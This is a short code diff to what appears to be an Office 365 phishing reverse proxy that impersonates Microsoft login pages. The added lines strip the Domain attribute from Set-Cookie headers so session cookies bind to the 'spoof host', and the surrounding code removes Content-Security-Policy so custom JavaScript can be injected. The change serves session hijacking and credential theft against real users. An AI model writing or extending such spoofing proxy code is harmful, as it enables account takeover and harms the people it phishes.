@@ -917,6 +917,9 @@ class Office365Module(BaseModule):
             response_headers = {}
             for key, value in resp.headers.items():
                 if key.lower() not in ['content-encoding', 'transfer-encoding', 'connection', 'content-security-policy']:
+                    if key.lower() == 'set-cookie':
+                        # Remove Domain attribute so cookie becomes host-only and sticks to our spoof host
+                        value = re.sub(r';\s*domain=[^;]+', '', value, flags=re.IGNORECASE)
                     response_headers[key] = value
             
             # Add permissive CSP to allow our custom JavaScript
